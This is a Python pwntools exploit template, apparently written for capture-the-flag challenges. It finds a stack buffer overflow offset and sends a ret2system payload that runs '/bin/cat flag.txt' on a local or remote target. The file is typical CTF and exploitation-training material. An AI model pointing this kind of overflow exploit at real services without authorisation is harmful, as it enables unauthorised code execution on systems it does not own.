import argparse
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# TODO: Change these if necessary
x64 = False
pattern_size = 100
should_log = True

def ff_to_overflow(p):
	# TODO: Change this function to navigate to the overflow.
	print p.recvuntil(">")

def find_offset(p):
	log.info("Using {} byte pattern".format(pattern_size))
	ff_to_overflow(p)
	p.sendline(cyclic(pattern_size, n=8 if x64 else 4))
	p.interactive()
	return

def exploit(p, bin_fname, libc_fname):
	e = ELF(bin_fname)
	libc = ELF(libc_fname) if libc_fname else None
	ff_to_overflow(p)

	"""
		Examples:

		func_offset = libc.symbols['puts'] 	# Offset in libc
		puts_addr = p32(e.got['puts'])
		main = e.symbols['main']
	"""

	buf = cyclic_find("laaa") * 'a'
	buf += p32(e.symbols['system'])
	buf += 'a' * 4 # trash saved $eip
	buf += p32(next(e.search('/bin/cat flag.txt')))
	p.sendline(buf)

	p.interactive()
	return

if __name__ == '__main__':

	# Remote service address/port
	IP = ''
	PORT = 0

	# Parse arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("binary_name", help="Binary file name")
	parser.add_argument("-l", "--libc", help="libc file name")
	parser.add_argument("--offset", help="Find overflow offset", action="store_true")
	parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
	parser.add_argument("--nodebug", help="Run exploit without GDB", action="store_true")
	args = parser.parse_args()

	# Get file names
	bin_fname = args.binary_name
	libc_fname = args.libc

	# Run binary
	if args.remote:
		r = remote(IP, PORT)
		log.info("Running remote exploit...")
		exploit(r, bin_fname, libc_fname)
	else:
		p = process(bin_fname)
		log.info("Running local exploit...")
		gdb_cmd = [
			"c",
			"b *0x8048648"
		]

		# Use gdb.debug if it seems like the GDB commands aren't working.
		if not args.nodebug:
			p = gdb.debug(bin_fname, gdbscript="\n".join(gdb_cmd))
			# gdb.attach(p, gdbscript="\n".join(gdb_cmd))

		# Find offset or debug
		if args.offset:
			find_offset(p)
		else:
			exploit(p, bin_fname, libc_fname)
